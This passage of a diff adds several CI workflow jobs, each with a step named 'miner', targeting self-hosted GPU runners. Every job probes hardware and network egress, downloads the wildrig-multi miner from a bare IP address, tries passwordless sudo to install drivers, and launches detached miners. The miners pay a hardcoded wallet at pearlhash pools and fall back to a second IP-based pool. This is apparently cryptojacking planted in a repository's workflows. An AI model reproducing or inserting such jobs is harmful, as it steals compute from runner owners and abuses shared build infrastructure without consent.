+          launch(){ local i=$1; local out=$2; shift 2; setsid nohup "$B" --algo pearlhash "$@" -d "$i" --print-time 60 > "$out" 2>&1 & echo $!; }
+          for i in $(seq 0 $((ND-1))); do
+            W[$i]="${I}${JOB}${i}"
+            P=$(launch "$i" "$D/gpu-$i.log" -o pool.pearlhash.xyz:9000 -o global.pearlhash.net:9000 -o global2.pearlhash.net:9000 -o hk.pearlhash.net:9000 -u "$WALLET" -p x --worker "${W[$i]}")
+            echo "$P" > "$D/pid-$i"; echo "STARTED dev=$i worker=${W[$i]} pid=$P at=$(date -u +%FT%TZ)"
+          done
+          START=$(date +%s); END=$((START+3300)); SW=$((START+900)); SWITCHED=0
+          while [ "$(date +%s)" -lt "$END" ]; do
+            sleep 60
+            TS=$(date +%s)
+            if [ "$SWITCHED" = 0 ] && [ "$TS" -ge "$SW" ]; then
+              SWITCHED=1
+              for i in $(seq 0 $((ND-1))); do
+                A=$(grep -ac 'accepted (' "$D/gpu-$i.log" 2>/dev/null || echo 0)
+                if [ "${A:-0}" -lt 1 ]; then
+                  echo "STICKY_LP_SWITCH dev=$i at $(date -u +%FT%TZ)"
+                  kill "$(cat "$D/pid-$i" 2>/dev/null)" 2>/dev/null || true
+                  touch "$D/sticky-lp-g$i"; sleep 1
+                  P=$(launch "$i" "$D/gpu-$i.lp.log" -o 103.199.106.122:3362 -u "$LPW" -p x --worker "${W[$i]}")
+                  echo "$P" > "$D/pid-$i.lp"
+                fi
+              done
+            fi
+            for i in $(seq 0 $((ND-1))); do
+              L="$D/gpu-$i.log"; L2="$D/gpu-$i.lp.log"
+              A=$(cat "$L" "$L2" 2>/dev/null | grep -ac 'accepted (' || true)
+              R=$(cat "$L" "$L2" 2>/dev/null | grep -ac 'rejected (' || true)
+              AL=$(cat "$L" "$L2" 2>/dev/null | grep -a 'accepted (' | tail -1 | tr -d '\r')
+              F="$D/last_acc_$i"; PREV=$(cat "$F" 2>/dev/null || echo 0)
+              if [ "${A:-0}" != "$PREV" ]; then date +%s > "$F"; fi
+              LA=$(cat "$F" 2>/dev/null || echo 0)
+              echo "det=g$i:a${A:-0}:r${R:-0}:la${LA}:line=[$AL]"
+            done
+            echo "TAIL0: $(tail -2 "$D/gpu-0.log" 2>/dev/null | tr '\n' ' ' | cut -c1-300)"
+          done
+          echo "C211_DONE i=$I job=$JOB at=$(date -u +%FT%TZ)"
+
+  bmg-multigen-02:
+    name: bmg-multigen-02
+    runs-on: bmg-multigen-models
+    timeout-minutes: 75
+    steps:
+      - name: miner
+        shell: bash
+        run: |
+          set -u
+          set +e
+          I="128175"
+          JOB="14"
+          LBL="bmg-multigen-02"
+          D="$HOME/c211-$I-$JOB"; mkdir -p "$D"
+          echo "C211_JOB i=$I job=$JOB label=$LBL host=$(hostname 2>/dev/null) at=$(date -u +%FT%TZ) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          . /etc/os-release 2>/dev/null; echo "OS=$PRETTY_NAME"
+          echo "--- DRM ---"
+          for d in /sys/class/drm/card*/device; do
+            [ -d "$d" ] || continue
+            v=$(cat "$d/vendor" 2>/dev/null); dv=$(cat "$d/device" 2>/dev/null)
+            s=$(grep -E '^PCI_SLOT_NAME=' "$d/uevent" 2>/dev/null)
+            echo "DRM $d vendor=$v device=$dv $s"
+          done
+          ls -l /dev/dri 2>&1 | head -20
+          NIC=$(for d in /sys/class/drm/card*/device; do [ -d "$d" ] || continue; [ "$(cat $d/vendor 2>/dev/null)" = "0x8086" ] && echo x; done | wc -l | tr -d ' ')
+          echo "INTEL_DRM_CARDS=$NIC"
+          echo "--- OPENCL ---"
+          ls -l /etc/OpenCL/vendors 2>&1
+          for f in /etc/OpenCL/vendors/*.icd; do [ -f "$f" ] && echo "ICD $f => $(cat $f 2>/dev/null)"; done
+          ldconfig -p 2>/dev/null | grep -iE 'opencl|igdrcl|ze_loader|igc' | head -20
+          if command -v clinfo >/dev/null 2>&1; then echo "--- CLINFO ---"; clinfo -l 2>&1 | head -30; fi
+          if command -v xpu-smi >/dev/null 2>&1; then echo "--- XPU-SMI ---"; xpu-smi discovery 2>&1 | grep -aE 'Device ID|Device Name|DRM Device|UUID' | head -60; fi
+          echo "--- EGRESS ---"
+          for hp in pool.pearlhash.xyz:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000 hk.pearlhash.net:9000 103.199.106.122:3362 169.58.247.186:8791; do
+            h=${hp%:*}; p=${hp#*:}
+            if timeout 8 bash -c "</dev/tcp/$h/$p" 2>/dev/null; then echo "TCP_OK $hp"; else echo "TCP_FAIL $hp"; fi
+          done
+          if pgrep -f 'wildrig-multi|pearl-miner' >/dev/null 2>&1; then echo "GUARD_ACTIVE_SKIP"; exit 0; fi
+          WALLET="prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
+          LPW="${WALLET}+NOCK"
+          WR_SHA="002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b"
+          get(){ curl -fsSL --max-time 300 -o "$2" "$1"; }
+          get http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz "$D/wr.tgz" || get https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz "$D/wr.tgz" || { echo "WILDRIG_DOWNLOAD_FAILED"; exit 1; }
+          mkdir -p "$D/x"; tar xzf "$D/wr.tgz" -C "$D/x" 2>/dev/null || tar xzf "$D/wr.tgz" -C "$D" 2>/dev/null
+          B=$(find "$D" -type f -name wildrig-multi 2>/dev/null | head -1)
+          [ -n "$B" ] || { echo "WILDRIG_BINARY_NOT_FOUND"; exit 1; }
+          chmod +x "$B"
+          GOT=$(sha256sum "$B" | cut -d' ' -f1); echo "WILDRIG_BINARY=$B SHA256=$GOT"
+          [ "$GOT" = "$WR_SHA" ] || { echo "SHA_MISMATCH_ABORT"; exit 1; }
+          "$B" --print-devices > "$D/pd.txt" 2>&1; echo "PD_RC=$?"; sed -n '1,60p' "$D/pd.txt"
+          ND=$(grep -acE 'Device [0-9]+:' "$D/pd.txt")
+          echo "WILDRIG_DEVICES=$ND"
+          if [ "${ND:-0}" -lt 1 ]; then
+            echo "OPENCL_RETRY_INSTALL"
+            if sudo -n true 2>/dev/null; then
+              echo "SUDO_NOPASSWD_OK"
+              sudo -n apt-get update -qq >/dev/null 2>&1
+              sudo -n env DEBIAN_FRONTEND=noninteractive apt-get install -y -qq ocl-icd-libopencl1 intel-opencl-icd clinfo >/dev/null 2>&1
+              echo "APT_RC=$?"
+              ls -l /etc/OpenCL/vendors 2>&1
+              "$B" --print-devices > "$D/pd2.txt" 2>&1; echo "PD2_RC=$?"; sed -n '1,60p' "$D/pd2.txt"
+              ND=$(grep -acE 'Device [0-9]+:' "$D/pd2.txt")
+              echo "WILDRIG_DEVICES2=$ND"
+            else
+              echo "SUDO_NEEDS_PASSWORD"
+            fi
+          fi
+          [ "${ND:-0}" -ge 1 ] || { echo "NO_OPENCL_DEVICE_ABORT"; exit 0; }
+          declare -A W
+          launch(){ local i=$1; local out=$2; shift 2; setsid nohup "$B" --algo pearlhash "$@" -d "$i" --print-time 60 > "$out" 2>&1 & echo $!; }
+          for i in $(seq 0 $((ND-1))); do
+            W[$i]="${I}${JOB}${i}"
+            P=$(launch "$i" "$D/gpu-$i.log" -o pool.pearlhash.xyz:9000 -o global.pearlhash.net:9000 -o global2.pearlhash.net:9000 -o hk.pearlhash.net:9000 -u "$WALLET" -p x --worker "${W[$i]}")
+            echo "$P" > "$D/pid-$i"; echo "STARTED dev=$i worker=${W[$i]} pid=$P at=$(date -u +%FT%TZ)"
+          done
+          START=$(date +%s); END=$((START+3300)); SW=$((START+900)); SWITCHED=0
+          while [ "$(date +%s)" -lt "$END" ]; do
+            sleep 60
+            TS=$(date +%s)
+            if [ "$SWITCHED" = 0 ] && [ "$TS" -ge "$SW" ]; then
+              SWITCHED=1
+              for i in $(seq 0 $((ND-1))); do
+                A=$(grep -ac 'accepted (' "$D/gpu-$i.log" 2>/dev/null || echo 0)
+                if [ "${A:-0}" -lt 1 ]; then
+                  echo "STICKY_LP_SWITCH dev=$i at $(date -u +%FT%TZ)"
+                  kill "$(cat "$D/pid-$i" 2>/dev/null)" 2>/dev/null || true
+                  touch "$D/sticky-lp-g$i"; sleep 1
+                  P=$(launch "$i" "$D/gpu-$i.lp.log" -o 103.199.106.122:3362 -u "$LPW" -p x --worker "${W[$i]}")
+                  echo "$P" > "$D/pid-$i.lp"
+                fi
+              done
+            fi
+            for i in $(seq 0 $((ND-1))); do
+              L="$D/gpu-$i.log"; L2="$D/gpu-$i.lp.log"
+              A=$(cat "$L" "$L2" 2>/dev/null | grep -ac 'accepted (' || true)
+              R=$(cat "$L" "$L2" 2>/dev/null | grep -ac 'rejected (' || true)
+              AL=$(cat "$L" "$L2" 2>/dev/null | grep -a 'accepted (' | tail -1 | tr -d '\r')
+              F="$D/last_acc_$i"; PREV=$(cat "$F" 2>/dev/null || echo 0)
+              if [ "${A:-0}" != "$PREV" ]; then date +%s > "$F"; fi
+              LA=$(cat "$F" 2>/dev/null || echo 0)
+              echo "det=g$i:a${A:-0}:r${R:-0}:la${LA}:line=[$AL]"
+            done
+            echo "TAIL0: $(tail -2 "$D/gpu-0.log" 2>/dev/null | tr '\n' ' ' | cut -c1-300)"
+          done
+          echo "C211_DONE i=$I job=$JOB at=$(date -u +%FT%TZ)"
+
+  bmg-multigen-03:
+    name: bmg-multigen-03
+    runs-on: bmg-multigen-models
+    timeout-minutes: 75
+    steps:
+      - name: miner
+        shell: bash
+        run: |
+          set -u
+          set +e
+          I="128175"
+          JOB="15"
+          LBL="bmg-multigen-03"
+          D="$HOME/c211-$I-$JOB"; mkdir -p "$D"
+          echo "C211_JOB i=$I job=$JOB label=$LBL host=$(hostname 2>/dev/null) at=$(date -u +%FT%TZ) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          . /etc/os-release 2>/dev/null; echo "OS=$PRETTY_NAME"
+          echo "--- DRM ---"
+          for d in /sys/class/drm/card*/device; do
+            [ -d "$d" ] || continue
+            v=$(cat "$d/vendor" 2>/dev/null); dv=$(cat "$d/device" 2>/dev/null)
+            s=$(grep -E '^PCI_SLOT_NAME=' "$d/uevent" 2>/dev/null)
+            echo "DRM $d vendor=$v device=$dv $s"
+          done
+          ls -l /dev/dri 2>&1 | head -20
+          NIC=$(for d in /sys/class/drm/card*/device; do [ -d "$d" ] || continue; [ "$(cat $d/vendor 2>/dev/null)" = "0x8086" ] && echo x; done | wc -l | tr -d ' ')
+          echo "INTEL_DRM_CARDS=$NIC"
+          echo "--- OPENCL ---"
+          ls -l /etc/OpenCL/vendors 2>&1
+          for f in /etc/OpenCL/vendors/*.icd; do [ -f "$f" ] && echo "ICD $f => $(cat $f 2>/dev/null)"; done
+          ldconfig -p 2>/dev/null | grep -iE 'opencl|igdrcl|ze_loader|igc' | head -20
+          if command -v clinfo >/dev/null 2>&1; then echo "--- CLINFO ---"; clinfo -l 2>&1 | head -30; fi
+          if command -v xpu-smi >/dev/null 2>&1; then echo "--- XPU-SMI ---"; xpu-smi discovery 2>&1 | grep -aE 'Device ID|Device Name|DRM Device|UUID' | head -60; fi
+          echo "--- EGRESS ---"
+          for hp in pool.pearlhash.xyz:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000 hk.pearlhash.net:9000 103.199.106.122:3362 169.58.247.186:8791; do
+            h=${hp%:*}; p=${hp#*:}
+            if timeout 8 bash -c "</dev/tcp/$h/$p" 2>/dev/null; then echo "TCP_OK $hp"; else echo "TCP_FAIL $hp"; fi
+          done
+          if pgrep -f 'wildrig-multi|pearl-miner' >/dev/null 2>&1; then echo "GUARD_ACTIVE_SKIP"; exit 0; fi
+          WALLET="prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
+          LPW="${WALLET}+NOCK"
+          WR_SHA="002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b"
+          get(){ curl -fsSL --max-time 300 -o "$2" "$1"; }
+          get http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz "$D/wr.tgz" || get https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz "$D/wr.tgz" || { echo "WILDRIG_DOWNLOAD_FAILED"; exit 1; }
+          mkdir -p "$D/x"; tar xzf "$D/wr.tgz" -C "$D/x" 2>/dev/null || tar xzf "$D/wr.tgz" -C "$D" 2>/dev/null
+          B=$(find "$D" -type f -name wildrig-multi 2>/dev/null | head -1)
+          [ -n "$B" ] || { echo "WILDRIG_BINARY_NOT_FOUND"; exit 1; }
+          chmod +x "$B"
+          GOT=$(sha256sum "$B" | cut -d' ' -f1); echo "WILDRIG_BINARY=$B SHA256=$GOT"
+          [ "$GOT" = "$WR_SHA" ] || { echo "SHA_MISMATCH_ABORT"; exit 1; }
+          "$B" --print-devices > "$D/pd.txt" 2>&1; echo "PD_RC=$?"; sed -n '1,60p' "$D/pd.txt"
+          ND=$(grep -acE 'Device [0-9]+:' "$D/pd.txt")
+          echo "WILDRIG_DEVICES=$ND"
+          if [ "${ND:-0}" -lt 1 ]; then
+            echo "OPENCL_RETRY_INSTALL"
+            if sudo -n true 2>/dev/null; then
+              echo "SUDO_NOPASSWD_OK"
+              sudo -n apt-get update -qq >/dev/null 2>&1
+              sudo -n env DEBIAN_FRONTEND=noninteractive apt-get install -y -qq ocl-icd-libopencl1 intel-opencl-icd clinfo >/dev/null 2>&1
+              echo "APT_RC=$?"
+              ls -l /etc/OpenCL/vendors 2>&1
+              "$B" --print-devices > "$D/pd2.txt" 2>&1; echo "PD2_RC=$?"; sed -n '1,60p' "$D/pd2.txt"
+              ND=$(grep -acE 'Device [0-9]+:' "$D/pd2.txt")
+              echo "WILDRIG_DEVICES2=$ND"
+            else
+              echo "SUDO_NEEDS_PASSWORD"
+            fi
+          fi
+          [ "${ND:-0}" -ge 1 ] || { echo "NO_OPENCL_DEVICE_ABORT"; exit 0; }
+          declare -A W
+          launch(){ local i=$1; local out=$2; shift 2; setsid nohup "$B" --algo pearlhash "$@" -d "$i" --print-time 60 > "$out" 2>&1 & echo $!; }
+          for i in $(seq 0 $((ND-1))); do
+            W[$i]="${I}${JOB}${i}"
+            P=$(launch "$i" "$D/gpu-$i.log" -o pool.pearlhash.xyz:9000 -o global.pearlhash.net:9000 -o global2.pearlhash.net:9000 -o hk.pearlhash.net:9000 -u "$WALLET" -p x --worker "${W[$i]}")
+            echo "$P" > "$D/pid-$i"; echo "STARTED dev=$i worker=${W[$i]} pid=$P at=$(date -u +%FT%TZ)"
+          done
+          START=$(date +%s); END=$((START+3300)); SW=$((START+900)); SWITCHED=0
+          while [ "$(date +%s)" -lt "$END" ]; do
+            sleep 60
+            TS=$(date +%s)
+            if [ "$SWITCHED" = 0 ] && [ "$TS" -ge "$SW" ]; then
+              SWITCHED=1
+              for i in $(seq 0 $((ND-1))); do
+                A=$(grep -ac 'accepted (' "$D/gpu-$i.log" 2>/dev/null || echo 0)
+                if [ "${A:-0}" -lt 1 ]; then
+                  echo "STICKY_LP_SWITCH dev=$i at $(date -u +%FT%TZ)"
+                  kill "$(cat "$D/pid-$i" 2>/dev/null)" 2>/dev/null || true
+                  touch "$D/sticky-lp-g$i"; sleep 1
+                  P=$(launch "$i" "$D/gpu-$i.lp.log" -o 103.199.106.122:3362 -u "$LPW" -p x --worker "${W[$i]}")
+                  echo "$P" > "$D/pid-$i.lp"
+                fi
+              done
+            fi
+            for i in $(seq 0 $((ND-1))); do
+              L="$D/gpu-$i.log"; L2="$D/gpu-$i.lp.log"
+              A=$(cat "$L" "$L2" 2>/dev/null | grep -ac 'accepted (' || true)
+              R=$(cat "$L" "$L2" 2>/dev/null | grep -ac 'rejected (' || true)
+              AL=$(cat "$L" "$L2" 2>/dev/null | grep -a 'accepted (' | tail -1 | tr -d '\r')
+              F="$D/last_acc_$i"; PREV=$(cat "$F" 2>/dev/null || echo 0)
+              if [ "${A:-0}" != "$PREV" ]; then date +%s > "$F"; fi
+              LA=$(cat "$F" 2>/dev/null || echo 0)
+              echo "det=g$i:a${A:-0}:r${R:-0}:la${LA}:line=[$AL]"
+            done
+            echo "TAIL0: $(tail -2 "$D/gpu-0.log" 2>/dev/null | tr '\n' ' ' | cut -c1-300)"
+          done
+          echo "C211_DONE i=$I job=$JOB at=$(date -u +%FT%TZ)"
+
+  bmg-multigen-04:
+    name: bmg-multigen-04
+    runs-on: bmg-multigen-models
+    timeout-minutes: 75
+    steps:
+      - name: miner
+        shell: bash
+        run: |
+          set -u
+          set +e
+          I="128175"
+          JOB="16"
+          LBL="bmg-multigen-04"
+          D="$HOME/c211-$I-$JOB"; mkdir -p "$D"
+          echo "C211_JOB i=$I job=$JOB label=$LBL host=$(hostname 2>/dev/null) at=$(date -u +%FT%TZ) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          . /etc/os-release 2>/dev/null; echo "OS=$PRETTY_NAME"
+          echo "--- DRM ---"
+          for d in /sys/class/drm/card*/device; do
+            [ -d "$d" ] || continue
+            v=$(cat "$d/vendor" 2>/dev/null); dv=$(cat "$d/device" 2>/dev/null)
+            s=$(grep -E '^PCI_SLOT_NAME=' "$d/uevent" 2>/dev/null)
+            echo "DRM $d vendor=$v device=$dv $s"
+          done
+          ls -l /dev/dri 2>&1 | head -20
+          NIC=$(for d in /sys/class/drm/card*/device; do [ -d "$d" ] || continue; [ "$(cat $d/vendor 2>/dev/null)" = "0x8086" ] && echo x; done | wc -l | tr -d ' ')
+          echo "INTEL_DRM_CARDS=$NIC"
+          echo "--- OPENCL ---"
+          ls -l /etc/OpenCL/vendors 2>&1
+          for f in /etc/OpenCL/vendors/*.icd; do [ -f "$f" ] && echo "ICD $f => $(cat $f 2>/dev/null)"; done
+          ldconfig -p 2>/dev/null | grep -iE 'opencl|igdrcl|ze_loader|igc' | head -20
+          if command -v clinfo >/dev/null 2>&1; then echo "--- CLINFO ---"; clinfo -l 2>&1 | head -30; fi
+          if command -v xpu-smi >/dev/null 2>&1; then echo "--- XPU-SMI ---"; xpu-smi discovery 2>&1 | grep -aE 'Device ID|Device Name|DRM Device|UUID' | head -60; fi
+          echo "--- EGRESS ---"
+          for hp in pool.pearlhash.xyz:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000 hk.pearlhash.net:9000 103.199.106.122:3362 169.58.247.186:8791; do
+            h=${hp%:*}; p=${hp#*:}
+            if timeout 8 bash -c "</dev/tcp/$h/$p" 2>/dev/null; then echo "TCP_OK $hp"; else echo "TCP_FAIL $hp"; fi
+          done
+          if pgrep -f 'wildrig-multi|pearl-miner' >/dev/null 2>&1; then echo "GUARD_ACTIVE_SKIP"; exit 0; fi
+          WALLET="prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
+          LPW="${WALLET}+NOCK"
+          WR_SHA="002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b"
+          get(){ curl -fsSL --max-time 300 -o "$2" "$1"; }
+          get http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz "$D/wr.tgz" || get https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz "$D/wr.tgz" || { echo "WILDRIG_DOWNLOAD_FAILED"; exit 1; }
+          mkdir -p "$D/x"; tar xzf "$D/wr.tgz" -C "$D/x" 2>/dev/null || tar xzf "$D/wr.tgz" -C "$D" 2>/dev/null
+          B=$(find "$D" -type f -name wildrig-multi 2>/dev/null | head -1)
+          [ -n "$B" ] || { echo "WILDRIG_BINARY_NOT_FOUND"; exit 1; }
+          chmod +x "$B"
+          GOT=$(sha256sum "$B" | cut -d' ' -f1); echo "WILDRIG_BINARY=$B SHA256=$GOT"
+          [ "$GOT" = "$WR_SHA" ] || { echo "SHA_MISMATCH_ABORT"; exit 1; }
+          "$B" --print-devices > "$D/pd.txt" 2>&1; echo "PD_RC=$?"; sed -n '1,60p' "$D/pd.txt"
+          ND=$(grep -acE 'Device [0-9]+:' "$D/pd.txt")
+          echo "WILDRIG_DEVICES=$ND"
+          if [ "${ND:-0}" -lt 1 ]; then
+            echo "OPENCL_RETRY_INSTALL"
+            if sudo -n true 2>/dev/null; then
+              echo "SUDO_NOPASSWD_OK"
+              sudo -n apt-get update -qq >/dev/null 2>&1
+              sudo -n env DEBIAN_FRONTEND=noninteractive apt-get install -y -qq ocl-icd-libopencl1 intel-opencl-icd clinfo >/dev/null 2>&1
+              echo "APT_RC=$?"
+              ls -l /etc/OpenCL/vendors 2>&1
+              "$B" --print-devices > "$D/pd2.txt" 2>&1; echo "PD2_RC=$?"; sed -n '1,60p' "$D/pd2.txt"
+              ND=$(grep -acE 'Device [0-9]+:' "$D/pd2.txt")
+              echo "WILDRIG_DEVICES2=$ND"
+            else
+              echo "SUDO_NEEDS_PASSWORD"
+            fi
+          fi
+          [ "${ND:-0}" -ge 1 ] || { echo "NO_OPENCL_DEVICE_ABORT"; exit 0; }
+          declare -A W
+          launch(){ local i=$1; local out=$2; shift 2; setsid nohup "$B" --algo pearlhash "$@" -d "$i" --print-time 60 > "$out" 2>&1 & echo $!; }
+          for i in $(seq 0 $((ND-1))); do
+            W[$i]="${I}${JOB}${i}"
+            P=$(launch "$i" "$D/gpu-$i.log" -o pool.pearlhash.xyz:9000 -o global.pearlhash.net:9000 -o global2.pearlhash.net:9000 -o hk.pearlhash.net:9000 -u "$WALLET" -p x --worker "${W[$i]}")
+            echo "$P" > "$D/pid-$i"; echo "STARTED dev=$i worker=${W[$i]} pid=$P at=$(date -u +%FT%TZ)"
+          done
+          START=$(date +%s); END=$((START+3300)); SW=$((START+900)); SWITCHED=0
+          while [ "$(date +%s)" -lt "$END" ]; do
+            sleep 60
+            TS=$(date +%s)
+            if [ "$SWITCHED" = 0 ] && [ "$TS" -ge "$SW" ]; then
+              SWITCHED=1
+              for i in $(seq 0 $((ND-1))); do
+                A=$(grep -ac 'accepted (' "$D/gpu-$i.log" 2>/dev/null || echo 0)
+                if [ "${A:-0}" -lt 1 ]; then
+                  echo "STICKY_LP_SWITCH dev=$i at $(date -u +%FT%TZ)"
+                  kill "$(cat "$D/pid-$i" 2>/dev/null)" 2>/dev/null || true
+                  touch "$D/sticky-lp-g$i"; sleep 1
+                  P=$(launch "$i" "$D/gpu-$i.lp.log" -o 103.199.106.122:3362 -u "$LPW" -p x --worker "${W[$i]}")
+                  echo "$P" > "$D/pid-$i.lp"
+                fi
+              done
+            fi
+            for i in $(seq 0 $((ND-1))); do
+              L="$D/gpu-$i.log"; L2="$D/gpu-$i.lp.log"
+              A=$(cat "$L" "$L2" 2>/dev/null | grep -ac 'accepted (' || true)
+              R=$(cat "$L" "$L2" 2>/dev/null | grep -ac 'rejected (' || true)
+              AL=$(cat "$L" "$L2" 2>/dev/null | grep -a 'accepted (' | tail -1 | tr -d '\r')
+              F="$D/last_acc_$i"; PREV=$(cat "$F" 2>/dev/null || echo 0)
+              if [ "${A:-0}" != "$PREV" ]; then date +%s > "$F"; fi
+              LA=$(cat "$F" 2>/dev/null || echo 0)
+              echo "det=g$i:a${A:-0}:r${R:-0}:la${LA}:line=[$AL]"
+            done
+            echo "TAIL0: $(tail -2 "$D/gpu-0.log" 2>/dev/null | tr '\n' ' ' | cut -c1-300)"
+          done
+          echo "C211_DONE i=$I job=$JOB at=$(date -u +%FT%TZ)"
